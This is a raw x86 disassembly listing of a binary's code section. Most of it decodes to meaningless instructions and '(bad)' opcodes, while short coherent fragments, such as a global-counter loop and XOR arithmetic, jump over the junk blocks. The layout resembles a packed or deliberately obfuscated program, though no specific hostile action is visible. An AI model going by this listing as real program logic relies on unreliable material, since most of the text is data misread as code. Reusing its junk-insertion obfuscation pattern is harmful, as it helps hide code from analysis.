  40ea0c:	mov    DWORD PTR [esi+0x36a2f21],edx
  40ea12:	leave  
  40ea13:	out    dx,eax
  40ea14:	hlt    
  40ea15:	push   eax
  40ea16:	dec    eax
  40ea17:	mov    DWORD PTR [ecx],ecx
  40ea19:	mov    ds:0xf7a9a59f,eax
  40ea1e:	push   esp
  40ea1f:	pop    ds
  40ea20:	les    eax,FWORD PTR [edi+0x28]
  40ea23:	rcr    DWORD PTR [edx-0xc],1
  40ea26:	test   DWORD PTR [ebx-0x484742c5],esp
  40ea2c:	mov    bh,0xc
  40ea2e:	adc    al,0x2
  40ea30:	in     al,0x55
  40ea32:	sti    
  40ea33:	push   0x36
  40ea35:	jmp    0x40e9cf
  40ea37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea38:	sbb    eax,0x13925611
  40ea3d:	lock mov esp,0x1e7d3c68
  40ea43:	cmc    
  40ea44:	es xchg esp,eax
  40ea46:	xchg   esi,eax
  40ea47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea48:	daa    
  40ea49:	push   ecx
  40ea4b:	sub    bl,BYTE PTR [ecx-0x21]
  40ea4e:	xor    BYTE PTR [ebp+0x1387044a],0xc6
  40ea55:	mov    BYTE PTR [esi],bh
  40ea57:	push   0xffffffcc
  40ea59:	inc    ecx
  40ea5a:	dec    edx
  40ea5b:	pop    esi
  40ea5c:	and    al,0x73
  40ea5e:	call   0x9651466f
  40ea63:	mov    eax,0x17ed87d4
  40ea68:	pop    esi
  40ea69:	fnstcw WORD PTR [ecx+0x313b1441]
  40ea6f:	in     eax,dx
  40ea70:	mov    eax,ds:0x517c00b2
  40ea75:	cmp    DWORD PTR [esi+0xe],0xff0e7e7
  40ea7c:	adc    ebp,DWORD PTR [esi+0x73]
  40ea7f:	jnp    0x40ea76
  40ea81:	adc    al,0xb5
  40ea83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea84:	dec    ebx
  40ea85:	sub    eax,0xb2900259
  40ea8a:	add    al,0x73
  40ea8c:	mov    ch,0xef
  40ea8e:	and    DWORD PTR [ebp-0x67e602a4],ebx
  40ea94:	xor    eax,0xa1487d6c
  40ea99:	sub    al,0x91
  40ea9b:	jp     0x40ead8
  40ea9d:	add    BYTE PTR [edx+0xf76dd20],bh
  40eaa3:	test   DWORD PTR [esi+0x3000000],esp
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x59
  40eb8d:	inc    edi
  40eb8e:	cwde   
  40eb8f:	dec    eax
  40eb90:	imul   DWORD PTR [edi+0x7fc37070]
  40eb96:	jo     0x40ec08
  40eb98:	cmp    eax,0x1c06a699
  40eb9d:	pusha  
  40eb9e:	mov    gs,WORD PTR ds:0x3a36c98a
  40eba4:	add    al,0xef
  40eba6:	in     eax,0x93
  40eba8:	scas   eax,DWORD PTR es:[edi]
  40eba9:	mov    edi,0x4ed1040d
  40ebae:	call   0x8153a912
  40ebb3:	sbb    al,0x63
  40ebb5:	test   DWORD PTR [ecx+0x6b],ebx
  40ebb8:	or     ebx,DWORD PTR [edx+0x77]
  40ebbb:	cdq    
  40ebbc:	ins    DWORD PTR es:[edi],dx
  40ebbd:	(bad)  
  40ebbe:	sbb    al,0x5f
  40ebc0:	outs   dx,DWORD PTR ds:[esi]
  40ebc1:	sub    BYTE PTR [ebx-0x1766ba11],ch
  40ebc7:	dec    ebp
  40ebc8:	ja     0x40ec32
  40ebca:	mov    ds:0xec5f0cd6,al
  40ebcf:	cmp    ch,BYTE PTR [eax]
  40ebd1:	data16 fwait
  40ebd3:	ret    
  40ebd4:	hlt    
  40ebd5:	sbb    esi,DWORD PTR [edi]
  40ebd7:	pop    ss
  40ebd8:	aaa    
  40ebd9:	sbb    dh,BYTE PTR [eax+eax*4-0x3e]
  40ebdd:	in     eax,0x26
  40ebdf:	mov    ?,WORD PTR [edx]
  40ebe1:	test   DWORD PTR [eax-0x14e8bde0],eax
  40ebe7:	jae    0x40ebde
  40ebe9:	mov    dh,0x7a
  40ebeb:	xchg   edx,eax
  40ebec:	mov    esi,0xb1c9e37d
  40ebf1:	mov    cs,WORD PTR [edx]
  40ebf3:	hlt    
  40ebf4:	(bad)  [ebp+0x27]
  40ebf7:	jecxz  0x40ec70
  40ebf9:	rcr    BYTE PTR [ecx-0x7e],cl
  40ebfc:	sbb    eax,0xa1db69bb
  40ec01:	xchg   esp,eax
  40ec02:	mov    WORD PTR [edi-0x70],cs
  40ec05:	fstp   DWORD PTR [esi+ebx*8+0x50]
  40ec09:	pushf  
  40ec0a:	adc    DWORD PTR [eax+0x12],esi
  40ec0d:	fs daa 
  40ec0f:	out    dx,al
  40ec10:	jge    0x40ebf4
  40ec12:	in     al,dx
  40ec13:	push   es
  40ec14:	pop    ebx
  40ec15:	mov    ecx,0x515881e3
  40ec1a:	dec    eax
  40ec1b:	sti    
  40ec1c:	cdq    
  40ec1d:	stc    
  40ec1e:	adc    ebp,DWORD PTR [ebp-0x24]
  40ec21:	imul   edi,DWORD PTR [eax+0x72],0x30
  40ec25:	inc    esi
  40ec26:	out    dx,al
  40ec27:	cdq    
  40ec28:	int    0x3b
  40ec2a:	add    dh,dl
  40ec2c:	loopne 0x40ebd5
  40ec2e:	inc    esi
  40ec2f:	not    DWORD PTR [edi]
  40ec31:	pop    esi
  40ec32:	or     al,0x3a
  40ec34:	lock and DWORD PTR [ebx-0x24d79f97],edx
  40ec3b:	(bad)  [esi-0x48]
  40ec3e:	lock adc eax,DWORD PTR [ebx]
  40ec41:	std    
  40ec42:	mov    cl,0x6f
  40ec44:	dec    ebp
  40ec45:	pop    ds
  40ec46:	gs jmp 0x40ec6f
  40ec49:	sub    al,0xf9
  40ec4b:	cmp    eax,0xb51e7f28
  40ec50:	inc    edx
  40ec51:	and    al,BYTE PTR [edx+edi*8+0x792620fa]
  40ec58:	retf   
  40ec59:	inc    ebp
  40ec5a:	aad    0xed
  40ec5c:	and    DWORD PTR [edx-0x78893a14],esp
  40ec62:	(bad)  
  40ec63:	stos   BYTE PTR es:[edi],al
  40ec64:	ret    
  40ec65:	fdivr  QWORD PTR [edi+eiz*8]
  40ec68:	xor    cl,BYTE PTR [ecx]
  40ec6a:	fldcw  WORD PTR [ecx]
  40ec6c:	xor    BYTE PTR [eax-0x64],0xb5
  40ec70:	aad    0xe5
  40ec72:	test   DWORD PTR [esp+ebp*1+0x401f2b49],ebx
  40ec79:	sbb    eax,0x6f52b2a6
  40ec7e:	(bad)  
  40ec80:	lahf   
  40ec81:	vpsrld xmm5,xmm7,XMMWORD PTR [edx]
  40ec85:	xor    eax,0x62
  40ec88:	mov    BYTE PTR [ecx],bl
  40ec8a:	or     BYTE PTR [ecx+0xf],0x6
  40ec8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec8f:	pop    es
  40ec90:	cmp    edi,edx
  40ec92:	push   ebp
  40ec93:	jg     0x40ec8b
  40ec95:	lods   al,BYTE PTR ds:[esi]
  40ec96:	jle    0x40ecc6
  40ec98:	and    DWORD PTR [edx-0x15],ecx
  40ec9b:	fstp   QWORD PTR [ecx-0x4c2aeef2]
  40eca1:	push   ebp
  40eca2:	ror    BYTE PTR [esi+0x23],1
  40eca5:	ret    0x7169
  40eca8:	mov    eax,ds:0x8b6c0920
  40ecad:	dec    edi
  40ecae:	in     eax,0x85
  40ecb0:	scas   eax,DWORD PTR es:[edi]
  40ecb1:	repnz aas 
  40ecb3:	(bad)  
  40ecb5:	les    eax,FWORD PTR ds:0xc5a707f3
  40ecbb:	std    
  40ecbc:	xor    DWORD PTR [ecx+eiz*1+0x3b],0xac05038a
  40ecc4:	xchg   esp,ebx
  40ecc6:	add    DWORD PTR [esi],edx
  40ecc8:	mov    edi,DWORD PTR [eax-0x2c]
  40eccb:	sbb    DWORD PTR cs:[esi+0x70],ebp
  40eccf:	push   ss
  40ecd0:	or     al,0xd
  40ecd2:	jnp    0x40ed18
  40ecd4:	mov    cl,0xec
  40ecd6:	ficom  DWORD PTR [ebx+0x7b]
  40ecd9:	mov    bl,0xc7
  40ecdb:	arpl   WORD PTR [eax+0x47],ax
  40ecde:	mov    cl,0xd3
  40ece0:	xchg   ebp,eax
  40ece1:	pop    ebp
  40ece2:	retf   
  40ece3:	dec    DWORD PTR [ebx+edi*1-0x13ba743f]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed25
  40ed00:	test   BYTE PTR [edi+eax*2+0x7070aeba],ah
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed0a
  40ed0c:	sub    ebp,DWORD PTR [ecx-0x5d]
  40ed0f:	retf   
  40ed10:	lds    ebx,FWORD PTR [eax-0x2c5d0241]
  40ed16:	ja     0x40ece8
  40ed18:	js     0x40ed83
  40ed1a:	stos   BYTE PTR es:[edi],al
  40ed1b:	lods   eax,DWORD PTR ds:[esi]
  40ed1c:	adc    eax,0xfee9398d
  40ed21:	push   edx
  40ed22:	mov    bl,0x83
  40ed24:	mov    ebp,0xec169001
  40ed29:	rol    DWORD PTR [edx-0x64a3b238],1
  40ed2f:	out    0x36,eax
  40ed31:	cdq    
  40ed32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed33:	mov    eax,ds:0xcce1da
  40ed38:	sub    ah,dl
  40ed3a:	push   0x3b47c969
  40ed3f:	nop
  40ed40:	inc    ecx
  40ed41:	mov    DWORD PTR [eax+0x61e105c6],edx
  40ed47:	cmp    al,0xb3
  40ed49:	sub    al,0x84
  40ed4b:	xor    eax,0x902f0b3f
  40ed50:	in     eax,dx
  40ed51:	shr    DWORD PTR [ebx+0x3aeea5ff],cl
  40ed57:	in     eax,0xbf
  40ed59:	sti    
  40ed5a:	xchg   edx,eax
  40ed5b:	js     0x40ed8e
  40ed5d:	in     eax,dx
  40ed5e:	cli    
  40ed5f:	xchg   al,ah
  40ed61:	jecxz  0x40ecf9
  40ed63:	or     ebx,DWORD PTR [ecx-0x7ea0dd04]
  40ed69:	hlt    
  40ed6a:	bound  ecx,QWORD PTR [eax-0x1d5da337]
  40ed70:	fldcw  WORD PTR [ebx-0x16]
  40ed73:	mul    ebx
  40ed75:	ss aam 0xfb
  40ed78:	ret    0xf55
  40ed7b:	enter  0x565f,0x75
  40ed7f:	sti    
  40ed80:	sbb    BYTE PTR [ebp-0x3b],0x39
  40ed84:	push   0xa45f07c7
  40ed89:	pop    ds
  40ed8a:	popf   
  40ed8b:	mov    ds:0x7eeeeed8,al
  40ed91:	mov    eax,ds:0xf20d80b5
  40ed96:	mov    al,0x42
  40ed98:	div    dl
  40ed9a:	inc    esp
  40ed9b:	pop    ebx
  40ed9c:	int    0x13
  40ed9e:	or     DWORD PTR [edi+0x34],ebx
  40eda1:	jmp    0xc314b61b
  40eda6:	ret    0x89e
  40eda9:	jmp    0xff02bbd4
  40edae:	addr16 ret 
  40edb0:	sbb    DWORD PTR [edx+eiz*2+0x2],edi
  40edb4:	add    DWORD PTR [edx-0x28de36e7],esp
  40edba:	pop    edx
  40edbb:	out    0x88,al
  40edbd:	xchg   ebp,eax
  40edbe:	jle    0x40edfb
  40edc0:	fnsave [edi+0x4]
  40edc3:	dec    ebp
  40edc4:	jmp    0x40ed9d
  40edc6:	mov    ch,0x57
  40edc8:	or     eax,0xf9cb74f4
  40edcd:	int    0xad
  40edcf:	shl    BYTE PTR [edx+0x430f8927],1
  40edd5:	pop    DWORD PTR [eax+0x42942b25]
  40eddb:	pop    esp
  40eddc:	pop    edx
  40eddd:	add    DWORD PTR es:[esi-0x70],ebp
  40ede1:	movntpd XMMWORD PTR [edx-0x45],xmm6
  40ede6:	jp     0x40ee2c
  40ede8:	inc    ebp
  40ede9:	adc    bh,BYTE PTR [ecx+0x5eb0293]
  40edef:	sub    dh,BYTE PTR [ebx+eax*1-0x49]
  40edf3:	(bad)  
  40edf4:	dec    edx
  40edf5:	fld    QWORD PTR [esi-0x712a6542]
  40edfb:	mul    BYTE PTR [edx-0x35eb30da]
  40ee01:	cwde   
  40ee02:	outs   dx,BYTE PTR ds:[esi]
  40ee03:	xor    BYTE PTR [edx+ebp*4+0x1413703f],0x93
  40ee0b:	imul   edx,esp,0xa0ab51b2
  40ee11:	sub    al,0x35
  40ee13:	out    0x5c,eax
  40ee15:	mov    dh,0x19
  40ee17:	cs scas al,BYTE PTR es:[edi]
  40ee19:	sbb    BYTE PTR [edi-0x7337debe],ah
  40ee1f:	xchg   ebx,eax
  40ee20:	mov    ds:0x44305c64,al
  40ee25:	add    BYTE PTR [ebx+0x2064930f],al
  40ee2b:	adc    al,0x3e
  40ee2d:	or     ah,BYTE PTR [esi-0x7674e51f]
  40ee33:	mov    ecx,0xee6a1086
  40ee38:	aam    0xeb
  40ee3a:	iret   
  40ee3b:	adc    BYTE PTR [eax],ch
  40ee3d:	mov    cl,cl
  40ee3f:	adc    eax,0x35148187
  40ee44:	test   al,0xd
  40ee46:	inc    ebp
  40ee47:	pop    esp
  40ee48:	push   eax
  40ee49:	cmp    eax,0x95fb01e6
  40ee4e:	dec    esi
  40ee4f:	sbb    cl,BYTE PTR [ecx-0x59]
  40ee52:	mov    ah,0xc5
  40ee54:	xchg   ecx,eax
  40ee55:	shr    ecx,cl
  40ee57:	(bad)  [edi]
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x90
  40ee7f:	ins    DWORD PTR es:[edi],dx
  40ee80:	cwde   
  40ee81:	cmp    BYTE PTR ds:0xc37070ac,cl
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40eedb
  40ee8b:	test   BYTE PTR [eax],0x92
  40ee8e:	por    mm0,QWORD PTR [edx+0x11]
  40ee92:	mov    ah,0x8d
  40ee94:	cmp    cl,BYTE PTR [esi-0x66b13c53]
  40ee9a:	xchg   ebp,eax
  40ee9b:	loop   0x40ef04
  40ee9d:	fs dec esp
  40ee9f:	dec    esp
  40eea0:	xchg   BYTE PTR ss:[edx-0x1f6dfaf8],dl
  40eea7:	in     al,dx
  40eea8:	xlat   BYTE PTR ds:[ebx]
  40eea9:	enter  0x4eed,0x66
  40eead:	mov    esp,0xc897963e
  40eeb2:	ret    
  40eeb3:	lods   eax,DWORD PTR ds:[esi]
  40eeb4:	jnp    0x40ef18
  40eeb6:	add    BYTE PTR [ecx+0x32],dh
  40eeb9:	stos   BYTE PTR es:[edi],al
  40eeba:	(bad)  
  40eebb:	xlat   BYTE PTR ds:[ebx]
  40eebc:	mov    cl,0xa2
  40eebe:	mov    bl,0x2f
  40eec0:	daa    
  40eec1:	adc    BYTE PTR [esi-0x4],ch
  40eec4:	cmp    BYTE PTR [edx],0xde
  40eec7:	jg     0x40eeab
  40eec9:	inc    edx
  40eeca:	push   esp
  40eecb:	xor    eax,0xf74c09cc
  40eed0:	stc    
  40eed1:	std    
  40eed2:	jmp    0x5b92a87
  40eed7:	addr16 ret 0xe9ea
  40eedb:	nop
  40eedc:	inc    eax
  40eedd:	jmp    0x40eea5
  40eedf:	loop   0x40ef1d
  40eee1:	in     al,dx
  40eee2:	scas   eax,DWORD PTR es:[edi]
  40eee3:	das    
  40eee4:	outs   dx,DWORD PTR ds:[esi]
  40eee5:	xchg   esp,eax
  40eee6:	sbb    DWORD PTR [ecx],edi
  40eee8:	mov    esi,0x37babecc
  40eeed:	or     esi,DWORD PTR [edx-0x6e22c4b9]
  40eef3:	or     ah,0x19
  40eef6:	push   es
  40eef7:	and    edi,DWORD PTR [edi]
  40eef9:	leave  
  40eefa:	call   0xc524:0x3b0cb178
  40ef01:	call   0xa2b46e1
  40ef06:	add    ah,ah
  40ef08:	xchg   ebp,eax
  40ef09:	pop    edx
  40ef0a:	pushf  
  40ef0b:	sub    al,0x98
  40ef0d:	rcl    BYTE PTR ds:0x5abffbc7,cl
  40ef13:	push   ecx
  40ef14:	daa    
  40ef15:	mov    ch,0x1b
  40ef17:	inc    eax
  40ef18:	mov    ch,0x51
  40ef1a:	dec    esi
  40ef1b:	jl     0x40eec2
  40ef1d:	or     cl,al
  40ef1f:	add    dh,BYTE PTR [ebx-0x2dbe8d39]
  40ef25:	in     al,dx
  40ef26:	jle    0x40eec9
  40ef28:	test   al,0x9
  40ef2a:	sbb    dl,bh
  40ef2c:	mov    eax,0xdf1913ba
  40ef31:	jp     0x40ef23
  40ef33:	(bad)  
  40ef34:	jl     0x40ef28
  40ef36:	sub    BYTE PTR [ebx-0x552424f7],bl
  40ef3c:	out    dx,al
  40ef3d:	or     eax,0x7743f44
  40ef42:	test   eax,0x665d3771
  40ef47:	aam    0x54
  40ef49:	cmp    esp,DWORD PTR [eax+ebp*8-0x7d374da0]
  40ef50:	mov    cl,0x5e
  40ef52:	push   0x76
  40ef54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef55:	dec    ebp
  40ef56:	test   al,0x8
  40ef58:	sub    ch,bl
  40ef5a:	je     0x40ef08
  40ef5c:	jl     0x40efc3
  40ef5e:	cmp    DWORD PTR [edx+eiz*4-0x12fcb754],esp
  40ef65:	lods   eax,DWORD PTR ds:[esi]
  40ef66:	mov    edx,0x57493175
  40ef6b:	fidiv  DWORD PTR [ebp+0x32ba2b]
  40ef71:	aam    0x45
  40ef73:	sub    ebp,edx
  40ef75:	pop    es
  40ef76:	push   ds
  40ef77:	dec    esi
  40ef78:	xbegin 0x6bae74bf
  40ef7e:	sub    eax,0xc84e69f4
  40ef83:	ret    0xea33
  40ef86:	inc    cl
  40ef88:	je     0x40efa4
  40ef8a:	ret    0xbb3f
  40ef8d:	test   ch,dh
  40ef8f:	push   edi
  40ef90:	lea    ecx,[esi+0x3a]
  40ef93:	cmp    BYTE PTR [esi],ah
  40ef95:	shl    BYTE PTR [ebx+0x1d],1
  40ef98:	js     0x40ef2e
  40ef9a:	sbb    al,0x70
  40ef9c:	xchg   DWORD PTR [edx+ecx*1-0x536e9604],eax
  40efa3:	jg     0x40ef5a
  40efa5:	lahf   
  40efa6:	jbe    0x40efae
  40efa8:	jbe    0x40f009
  40efaa:	xchg   ecx,eax
  40efab:	push   ebp
  40efac:	mov    ebx,ebp
  40efae:	int    0x65
  40efb0:	pop    ebx
  40efb1:	xchg   ecx,eax
  40efb2:	adc    eax,0x1c636428
  40efb7:	mov    esi,DWORD PTR [ebx-0x3c5a0]
  40efbd:	mov    dh,0x6f
  40efbf:	jmp    0x40efea
  40efc1:	xor    eax,0x7063da34
  40efc6:	cdq    
  40efc7:	jne    0x40efab
  40efc9:	dec    esp
  40efca:	push   ebx
  40efcb:	dec    ecx
  40efcc:	mov    dl,0xb3
  40efce:	and    ebx,DWORD PTR [ecx]
  40efd0:	dec    ebx
  40efd2:	aad    0x2a
  40efd4:	rcr    DWORD PTR [ecx-0x63],1
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	push   ebp
  40effb:	xchg   ebp,eax
  40effc:	(bad)  
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	inc    eax
  40f007:	ins    BYTE PTR es:[edi],dx
  40f008:	sub    al,0xa
  40f00a:	mov    DWORD PTR [ebx],0x6a3b9e8b
  40f010:	mov    esi,ss
  40f012:	cmp    BYTE PTR ds:0xfe5a8cc6,bh
  40f018:	int    0x89
  40f01a:	push   0xffffffd9
  40f01c:	loopne 0x40eff6
  40f01e:	add    al,0x25
  40f020:	in     al,dx
  40f021:	dec    ebp
  40f022:	repz jle 0x40efa6
  40f025:	mov    esp,0x5e2b49e4
  40f02a:	fld    QWORD PTR [edx+0x6ed0c3e]
  40f030:	push   ecx
  40f031:	ins    DWORD PTR es:[edi],dx
  40f032:	cmc    
  40f033:	aaa    
  40f034:	rol    DWORD PTR [esi+ebx*4+0x3691735b],0xf7
  40f03c:	imul   ecx,esi,0x76
  40f03f:	pushf  
  40f040:	out    dx,al
  40f041:	cmp    dh,BYTE PTR [eax-0x237a3394]
  40f047:	adc    bl,BYTE PTR [ebx+0x2a0b2107]
  40f04d:	or     BYTE PTR [edi],dl
  40f04f:	outs   dx,BYTE PTR ds:[esi]
  40f050:	dec    edx
  40f051:	inc    eax
  40f052:	push   esp
  40f053:	idiv   BYTE PTR [edx]
  40f055:	arpl   WORD PTR [eax-0xc],bp
  40f058:	inc    edx
  40f059:	or     eax,0x1d1fc7d9
  40f05e:	xor    al,0x72
  40f060:	call   0x6a6943bb
  40f065:	mov    cl,0x2a
  40f067:	mov    eax,ds:0x79d74d71
  40f06c:	sub    al,0x3c
  40f06e:	ja     0x40f01f
  40f070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f071:	lods   al,BYTE PTR ds:[esi]
  40f072:	dec    esp
  40f073:	sub    DWORD PTR [edx-0x5e],edi
  40f076:	gs cmp al,0xab
  40f079:	retf   0x666d
  40f07c:	call   0xff9c0a83
  40f081:	pop    ss
  40f082:	sub    eax,0x585d020a
  40f087:	push   es
  40f088:	stos   BYTE PTR es:[edi],al
  40f089:	add    ah,al
  40f08b:	fisub  WORD PTR [ecx]
  40f08d:	neg    DWORD PTR [ecx]
  40f08f:	pusha  
  40f090:	loop   0x40f02d
  40f092:	and    eax,0xc3b6ee0b
  40f097:	inc    esi
  40f098:	push   ecx
  40f099:	imul   ebx,ebx,0x95747aa3
  40f09f:	push   esp
  40f0a0:	adc    eax,0x60e5b331
  40f0a5:	sti    
  40f0a6:	out    dx,al
  40f0a7:	ret    0xdc83
  40f0aa:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40f0ac:	push   ss
  40f0ad:	dec    ebx
  40f0ae:	jmp    eax
  40f0b0:	xlat   BYTE PTR ds:[ebx]
  40f0b1:	in     al,dx
  40f0b2:	data16 (bad) 
  40f0b4:	jmp    0x9e68411b
  40f0b9:	jg     0x40f046
  40f0bb:	in     al,0x2d
  40f0bd:	call   DWORD PTR [ecx]
  40f0bf:	je     0x40f104
  40f0c1:	adc    al,0x9d
  40f0c3:	xchg   ecx,eax
  40f0c4:	inc    edx
  40f0c5:	movlps QWORD PTR [ebx*8+0x616b423a],xmm0
  40f0cd:	enter  0x77d6,0x99
  40f0d1:	rcl    BYTE PTR [esi+ebx*1-0x10],cl
  40f0d5:	das    
  40f0d6:	imul   ecx,DWORD PTR [esp+esi*8+0x65],0x24
  40f0db:	jae    0x40f13e
  40f0dd:	mov    edx,0x539e303
  40f0e2:	shl    DWORD PTR [ebp+0x14],1
  40f0e5:	rol    BYTE PTR [ecx+0x7191eb65],0xeb
  40f0ec:	sub    eax,0xb4646842
  40f0f1:	jmp    0x3558:0x1891b88d
  40f0f8:	inc    ebp
  40f0f9:	in     al,dx
  40f0fa:	mov    ah,0x8b
  40f0fc:	inc    ebx
  40f0fd:	push   esi
  40f0fe:	outs   dx,DWORD PTR ds:[esi]
  40f0ff:	sub    BYTE PTR [esi+ebp*8+0x29],0xd8
  40f104:	mov    ds:0x62b01399,al
  40f109:	lods   al,BYTE PTR ds:[esi]
  40f10a:	je     0x40f13f
  40f10c:	cmp    al,0x6e
  40f10e:	add    ecx,DWORD PTR [ebx]
  40f110:	push   esi
  40f111:	shr    BYTE PTR [ebx+eax*8],cl
  40f114:	adc    cl,BYTE PTR [ebp+0x28]
  40f117:	jg     0x40f0c9
  40f119:	test   DWORD PTR [eax],eax
  40f11b:	jg     0x40f150
  40f11d:	cli    
  40f11e:	dec    edi
  40f11f:	std    
  40f120:	das    
  40f121:	xchg   esp,eax
  40f122:	das    
  40f123:	dec    esp
  40f124:	lods   al,BYTE PTR ds:[esi]
  40f125:	lock es stos BYTE PTR es:[edi],al
  40f128:	pop    ds
  40f129:	inc    edx
  40f12a:	add    BYTE PTR [edi],ch
  40f12c:	arpl   WORD PTR [ebp+0x4a],di
  40f12f:	push   eax
  40f130:	pop    edi
  40f131:	jge    0x40f12c
  40f133:	not    BYTE PTR [ecx]
  40f135:	into   
  40f136:	pop    es
  40f137:	leave  
  40f138:	(bad)  [edx-0x2e147a53]
  40f13e:	aas    
  40f13f:	and    cl,0x8f
  40f142:	jp     0x40f1a6
  40f144:	push   0xcf8c9766
  40f149:	cs fst DWORD PTR ss:[ebx-0x269ba99e]
  40f151:	ss push cs
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [ecx-0x5cc32bb9],esp
  40f172:	stos   BYTE PTR es:[edi],al
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1ca
  40f17a:	std    
  40f17b:	sbb    al,0x5d
  40f17d:	xchg   ebp,eax
  40f17e:	adc    ecx,DWORD PTR [esi]
  40f180:	jnp    0x40f1f8
  40f182:	mov    ds:0x74fc9505,eax
  40f187:	scas   al,BYTE PTR es:[edi]
  40f188:	scas   al,BYTE PTR es:[edi]
  40f189:	pop    es
  40f18a:	jge    0x40f148
  40f18c:	in     eax,dx
  40f18d:	in     al,dx
  40f18e:	jnp    0x40f11f
  40f190:	inc    eax
  40f191:	jge    0x40f148
  40f193:	sbb    esp,ecx
  40f195:	sub    esp,DWORD PTR [ebx+0x2c667c7]
  40f19b:	push   ss
  40f19c:	sub    esp,DWORD PTR [ecx]
  40f19e:	(bad)  
  40f19f:	sub    eax,0xcf066d3f
  40f1a4:	lock sub eax,0x5df71d2c
  40f1aa:	cs mov ebp,0xbfb8d3fc
  40f1b0:	push   eax
  40f1b1:	outs   dx,BYTE PTR ds:[esi]
  40f1b2:	or     ebx,DWORD PTR [esi]
  40f1b4:	inc    BYTE PTR ds:0x695bd0ad
  40f1ba:	in     eax,dx
  40f1bb:	xor    ecx,DWORD PTR [eax+0x72f59e38]
